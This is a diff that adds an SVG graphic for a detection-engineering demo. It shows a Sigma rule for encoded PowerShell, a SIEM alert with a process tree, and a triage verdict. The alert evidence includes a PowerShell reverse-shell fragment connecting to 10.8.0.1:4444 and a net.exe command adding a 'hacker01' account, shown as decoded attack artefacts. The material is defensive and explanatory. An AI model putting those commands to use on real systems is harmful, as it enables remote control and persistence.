@@ -1,0 +1,114 @@
+<svg viewBox="0 0 860 580" xmlns="http://www.w3.org/2000/svg" font-family="'JetBrains Mono', 'Courier New', monospace">
+  <defs>
+    <style>
+      .win-bg { fill: #0d1117; }
+      .titlebar { fill: #1c2128; }
+      .panel { fill: #161b22; }
+      .hdr { fill: #58a6ff; font-weight: bold; }
+      .val-ok { fill: #3fb950; }
+      .val-warn { fill: #d29922; }
+      .val-err { fill: #f85149; }
+      .val-dim { fill: #8b949e; }
+      .label { fill: #c9d1d9; }
+      .sigma-key { fill: #f97583; }
+      .sigma-val { fill: #9ecbff; }
+      .sigma-comment { fill: #6a737d; }
+    </style>
+  </defs>
+
+  <!-- Window -->
+  <rect width="860" height="580" rx="10" class="win-bg" />
+  <rect width="860" height="38" rx="10" class="titlebar" />
+  <rect y="28" width="860" height="10" class="titlebar" />
+
+  <!-- Traffic lights -->
+  <circle cx="22" cy="19" r="6" fill="#ff5f57" />
+  <circle cx="42" cy="19" r="6" fill="#febc2e" />
+  <circle cx="62" cy="19" r="6" fill="#28c840" />
+
+  <text x="430" y="24" text-anchor="middle" fill="#8b949e" font-size="12">Detection Engineering — Sigma Rule + SIEM Validation</text>
+
+  <!-- Left panel: Sigma rule -->
+  <rect x="10" y="48" width="400" height="460" rx="6" class="panel"/>
+  <text x="25" y="68" fill="#58a6ff" font-size="11" font-weight="bold">sigma/rules/powershell_encoded.yml</text>
+  <line x1="10" y1="73" x2="410" y2="73" stroke="#30363d" stroke-width="1"/>
+
+  <!-- Sigma YAML content -->
+  <text x="20" y="90" class="sigma-key" font-size="11">title:</text>
+  <text x="73" y="90" class="sigma-val" font-size="11">PowerShell Encoded Command Execution</text>
+  <text x="20" y="106" class="sigma-key" font-size="11">id:</text>
+  <text x="43" y="106" class="sigma-val" font-size="11">5b23a9f8-c4e1-4d8b-a2e3-7f6c09d1e4b2</text>
+  <text x="20" y="122" class="sigma-key" font-size="11">status:</text>
+  <text x="80" y="122" class="sigma-val" font-size="11">stable</text>
+  <text x="20" y="138" class="sigma-key" font-size="11">description:</text>
+  <text x="20" y="154" class="sigma-val" font-size="11">  Detects PowerShell with -EncodedCommand or</text>
+  <text x="20" y="170" class="sigma-val" font-size="11">  -Enc flag, commonly used by malware to</text>
+  <text x="20" y="186" class="sigma-val" font-size="11">  obfuscate payloads (T1059.001)</text>
+  <text x="20" y="206" class="sigma-key" font-size="11">logsource:</text>
+  <text x="20" y="222" class="sigma-key" font-size="11">  category:</text>
+  <text x="105" y="222" class="sigma-val" font-size="11">process_creation</text>
+  <text x="20" y="238" class="sigma-key" font-size="11">  product:</text>
+  <text x="100" y="238" class="sigma-val" font-size="11">windows</text>
+  <text x="20" y="258" class="sigma-key" font-size="11">detection:</text>
+  <text x="20" y="274" class="sigma-key" font-size="11">  selection:</text>
+  <text x="20" y="290" class="sigma-key" font-size="11">    Image|endswith:</text>
+  <text x="20" y="306" class="sigma-val" font-size="11">      - '\powershell.exe'</text>
+  <text x="20" y="322" class="sigma-val" font-size="11">      - '\pwsh.exe'</text>
+  <text x="20" y="338" class="sigma-key" font-size="11">    CommandLine|contains|any:</text>
+  <text x="20" y="354" class="sigma-val" font-size="11">      - ' -EncodedCommand '</text>
+  <text x="20" y="370" class="sigma-val" font-size="11">      - ' -enc '</text>
+  <text x="20" y="386" class="sigma-val" font-size="11">      - ' -e '</text>
+  <text x="20" y="406" class="sigma-key" font-size="11">  filter_known_legit:</text>
+  <text x="20" y="422" class="sigma-key" font-size="11">    ParentImage|endswith:</text>
+  <text x="20" y="438" class="sigma-val" font-size="11">      - '\sccm.exe'</text>
+  <text x="20" y="454" class="sigma-val" font-size="11">      - '\mdt.exe'</text>
+  <text x="20" y="474" class="sigma-key" font-size="11">  condition:</text>
+  <text x="107" y="474" class="label" font-size="11">selection and not filter_known_legit</text>
+  <text x="20" y="490" class="sigma-key" font-size="11">falsepositives:</text>
+  <text x="20" y="506" class="sigma-val" font-size="11">  - SCCM deployment scripts (filtered)</text>
+
+  <!-- Right panel: alert fired + validation -->
+  <rect x="420" y="48" width="430" height="460" rx="6" class="panel"/>
+  <text x="435" y="68" fill="#3fb950" font-size="11" font-weight="bold">SIEM Alert Fired — Validation Evidence</text>
+  <line x1="420" y1="73" x2="850" y2="73" stroke="#30363d" stroke-width="1"/>
+
+  <!-- Alert details -->
+  <rect x="430" y="80" width="410" height="90" rx="4" fill="rgba(248,81,73,0.08)" stroke="#f85149" stroke-width="1"/>
+  <text x="440" y="97" class="val-err" font-size="11" font-weight="bold">🔴 ALERT: T1059.001 — PowerShell Encoded</text>
+  <text x="440" y="113" class="label" font-size="11">Host: WKSTN-0231 | User: jharris</text>
+  <text x="440" y="129" class="label" font-size="11">Time: 2026-04-08 03:42:17 UTC</text>
+  <text x="440" y="145" class="val-warn" font-size="11">Severity: HIGH | Rule: powershell_encoded</text>
+  <text x="440" y="161" class="val-dim" font-size="11">Rule version: 1.2 | FP rate last 30d: 0.4%</text>
+
+  <!-- Process tree -->
+  <text x="435" y="188" fill="#58a6ff" font-size="11" font-weight="bold">Process Tree (EDR enrichment)</text>
+  <text x="435" y="206" class="val-dim" font-size="11">explorer.exe (PID 4012)</text>
+  <text x="435" y="222" class="val-dim" font-size="11">  └─ WINWORD.EXE (PID 5781) ← macro</text>
+  <text x="435" y="238" class="val-err" font-size="11">      └─ powershell.exe (PID 7203) ← alert</text>
+  <text x="435" y="254" class="val-dim" font-size="11">          CommandLine:</text>
+  <text x="435" y="270" class="val-warn" font-size="11">          powershell -enc JABjAGwAaQBlAG4AdA...</text>
+  <text x="435" y="290" class="val-dim" font-size="11">          └─ cmd.exe (PID 7281)</text>
+  <text x="435" y="306" class="val-err" font-size="11">              └─ net.exe user /add hacker01</text>
+
+  <!-- Decoded payload -->
+  <text x="435" y="330" fill="#58a6ff" font-size="11" font-weight="bold">Decoded Base64 Payload</text>
+  <rect x="430" y="335" width="410" height="60" rx="4" fill="rgba(248,81,73,0.05)" stroke="#f85149" stroke-width="1"/>
+  <text x="440" y="351" class="val-err" font-size="11">$client = New-Object Net.Sockets.TCPClient('10.8.0.1',4444)</text>
+  <text x="440" y="367" class="val-err" font-size="11">$stream = $client.GetStream()</text>
+  <text x="440" y="383" class="val-dim" font-size="11"># Reverse shell connecting to 10.8.0.1:4444</text>
+
+  <!-- Verdict -->
+  <rect x="430" y="405" width="410" height="95" rx="4" fill="rgba(63,185,80,0.07)" stroke="#3fb950" stroke-width="1"/>
+  <text x="440" y="422" class="val-ok" font-size="11" font-weight="bold">TRIAGE VERDICT: TRUE POSITIVE — CONFIRMED</text>
+  <text x="440" y="438" class="label" font-size="11">Evidence chain:</text>
+  <text x="440" y="454" class="label" font-size="11">1. Word macro spawned PowerShell (phishing vector)</text>
+  <text x="440" y="470" class="label" font-size="11">2. Encoded cmd decoded to reverse shell</text>
+  <text x="440" y="486" class="label" font-size="11">3. C2 IP 10.8.0.1 → threat intel: known Cobalt Strike</text>
+  <text x="440" y="502" class="label" font-size="11">Action: Isolate host · Revoke user token · Open P1 IR</text>
+
+  <!-- Bottom sigma compile + test -->
+  <rect x="10" y="518" width="840" height="52" rx="6" fill="rgba(88,166,255,0.07)" stroke="#58a6ff" stroke-width="1"/>
+  <text x="25" y="535" fill="#58a6ff" font-size="11" font-weight="bold">Testing rule before deployment:</text>
+  <text x="25" y="551" class="label" font-size="11">$ sigma convert -t splunk rules/powershell_encoded.yml | splunk-sdk-python validate.py --test-data samples/tp_ps_encoded.json</text>
+  <text x="25" y="567" class="val-ok" font-size="11">✓ Rule compiled to SPL · TP matched (1/1) · FP suppressed (3/3 known SCCM events) · Ready for deployment</text>
+</svg>
